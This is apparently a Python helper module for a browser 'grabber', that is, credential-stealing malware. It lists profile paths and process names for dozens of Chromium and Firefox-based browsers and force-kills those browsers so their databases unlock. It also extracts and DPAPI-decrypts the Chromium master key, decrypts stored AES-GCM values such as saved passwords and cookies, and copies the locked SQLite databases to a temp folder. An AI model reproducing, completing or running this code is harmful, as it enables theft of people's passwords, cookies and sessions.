"""Shared browser utilities — process killing, DB access, encryption for all grabber modules."""

import os
import sys
import time
import json
import base64
import sqlite3
import shutil
import subprocess

BROWSER_DB_PATHS = {
    "Chrome": "Google/Chrome/User Data",
    "Chrome Beta": "Google/Chrome Beta/User Data",
    "Chrome Dev": "Google/Chrome SxS/User Data",
    "Chrome Canary": "Google/Chrome Canary/User Data",
    "Brave": "BraveSoftware/Brave-Browser/User Data",
    "Brave Beta": "BraveSoftware/Brave-Browser-Beta/User Data",
    "Brave Nightly": "BraveSoftware/Brave-Browser-Nightly/User Data",
    "Edge": "Microsoft/Edge/User Data",
    "Edge Beta": "Microsoft/Edge Beta/User Data",
    "Edge Dev": "Microsoft/Edge Dev/User Data",
    "Edge Canary": "Microsoft/Edge SxS/User Data",
    "Opera": "Opera Software/Opera Stable",
    "Opera GX": "Opera Software/Opera GX Stable",
    "Opera Beta": "Opera Software/Opera Beta",
    "Opera Developer": "Opera Software/Opera Developer",
    "Vivaldi": "Vivaldi/User Data",
    "Yandex": "Yandex/YandexBrowser/User Data",
    "Yandex Beta": "Yandex/YandexBrowser-Beta/User Data",
    "Epic Privacy": "Epic Privacy Browser/User Data",
    "UC Browser": "UCBrowser/User Data",
    "QQ Browser": "Tencent/QQBrowser/User Data",
    "Sputnik": "Sputnik/Sputnik/User Data",
    "Iron": "Chromodo/User Data",
    "CentBrowser": "CentBrowser/User Data",
    "SlimJet": "SlimJet/User Data",
    "Orbitum": "Orbitum/User Data",
    "Comodo": "Comodo/Dragon/User Data",
    "Avast": "AVAST Software/Browser/User Data",
    "AVG": "AVG/Browser/User Data",
    "360 Secure": "360Chrome/Chrome/User Data",
    "CocCoc": "CocCoc/Browser/User Data",
    "Falkon": "Falkon/profiles",
    "Ungoogled Chromium": "Chromium/User Data",
}

BROWSER_PROCESS_NAMES = [
    "chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "opera_gx.exe",
    "vivaldi.exe", "yandexbrowser.exe", "epic.exe", "ucbrowser.exe",
    "qqbrowser.exe", "sputnik.exe", "iron.exe", "centbrowser.exe",
    "slimjet.exe", "orbitum.exe", "dragon.exe", "avastbrowser.exe",
    "avgbrowser.exe", "360chrome.exe", "coccoc.exe", "falkon.exe",
    "chromium.exe",
]

FIREFOX_PATHS = {
    "Firefox": "Mozilla/Firefox/Profiles",
    "Waterfox": "Waterfox/Profiles",
    "Pale Moon": "Pale Moon/Profiles",
    "Basilisk": "Basilisk/Profiles",
    "SeaMonkey": "Mozilla/SeaMonkey/Profiles",
    "Floorp": "Floorp/Profiles",
    "LibreWolf": "LibreWolf/Profiles",
    "Mercury": "Mozilla/Firefox/Profiles",
    "Tor Browser": "Tor Browser/Browser/TorBrowser/Data/Browser/profile.default",
}

FIREFOX_PROCESS_NAMES = [
    "firefox.exe", "waterfox.exe", "palemoon.exe", "basilisk.exe",
    "seamonkey.exe", "floorp.exe", "librewolf.exe", "mercury.exe",
    "torbrowser.exe",
]

CHROMIUM_LOCAL_STATE = "Local State"


def _get_appdata():
    return os.environ.get("LOCALAPPDATA", os.environ.get("APPDATA", ""))

def _get_roaming():
    return os.environ.get("APPDATA", "")


def kill_browsers(extra_names=None):
    killed = []
    all_names = BROWSER_PROCESS_NAMES + FIREFOX_PROCESS_NAMES + (extra_names or [])
    for name in all_names:
        try:
            r = subprocess.run(["taskkill", "/F", "/IM", name],
                               capture_output=True, timeout=5)
            if r.returncode == 0:
                killed.append(name)
        except Exception:
            pass
    return killed


def wait_for_release(paths, max_wait=5):
    t0 = time.time()
    while time.time() - t0 < max_wait:
        all_free = True
        for p in paths:
            if os.path.isfile(p):
                try:
                    with open(p, 'rb') as f:
                        f.read(1)
                except (PermissionError, IOError):
                    all_free = False
                    break
        if all_free:
            return True
        time.sleep(0.3)
    return False


def get_chromium_key(browser_path):
    local = os.path.join(_get_appdata(), browser_path, CHROMIUM_LOCAL_STATE)
    if not os.path.isfile(local):
        local = os.path.join(_get_appdata(), browser_path, "../", CHROMIUM_LOCAL_STATE)
        local = os.path.normpath(local)
    if not os.path.isfile(local):
        return None
    try:
        with open(local, "r", encoding="utf-8") as f:
            state = json.load(f)
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        try:
            import win32crypt
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except ImportError:
            pass
        try:
            from Cryptodome.Cipher import AES
            import win32crypt
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except ImportError:
            pass
        return key
    except Exception:
        return None


def decrypt_chromium_value(value, key):
    if not value:
        return ""
    if isinstance(value, str):
        return value
    try:
        if value[:3] == b'v10' or value[:3] == b'v11' or value[:3] == b'v20':
            try:
                import win32crypt
                return win32crypt.CryptUnprotectData(value, None, None, None, 0)[1].decode("utf-8", errors="ignore")
            except ImportError:
                pass
            try:
                from Cryptodome.Cipher import AES
                import win32crypt
                iv = value[3:15]
                encrypted = value[15:-16]
                tag = value[-16:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt_and_verify(encrypted, tag)
                return decrypted.decode("utf-8", errors="ignore")
            except ImportError:
                pass
        return value.decode("utf-8", errors="ignore") if isinstance(value, bytes) else str(value)
    except Exception:
        return ""


def get_chromium_profiles(browser_path):
    user_data = os.path.join(_get_appdata(), browser_path)
    if not os.path.isdir(user_data):
        return []
    profiles = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4",
                "Profile 5", "Profile 6", "Profile 7", "Guest Profile",
                "System Profile", "Default - Network"]
    found = []
    for p in profiles:
        path = os.path.join(user_data, p)
        if os.path.isdir(path):
            found.append((p, path))
    return found


def get_firefox_profiles(firefox_path):
    base = os.path.join(_get_roaming(), firefox_path)
    if not os.path.isdir(base):
        return []
    profiles = []
    for item in os.listdir(base):
        if item.endswith('.default') or item.endswith('.default-release') or item.endswith('.default-esr'):
            path = os.path.join(base, item)
            if os.path.isdir(path):
                profiles.append((item, path))
    return profiles


def copy_and_lock(src):
    try:
        tmp = os.path.join(os.environ.get("TEMP", "."), f"grab_{os.path.basename(src)}_{os.getpid()}.db")
        shutil.copy2(src, tmp)
        return tmp
    except (PermissionError, IOError):
        return None


def safe_db_read(path):
    tmp = copy_and_lock(path)
    if not tmp:
        return None
    try:
        conn = sqlite3.connect(tmp)
        return conn
    except Exception:
        return None
    finally:
        try:
            os.remove(tmp)
        except Exception:
            pass


def format_results(title, results):
    if not results:
        return f"[{title}] No results found"
    lines = [f"[{title}] {len(results)} result(s):"]
    for r in results:
        lines.append(f"  {r}")
    return "\n".join(lines)
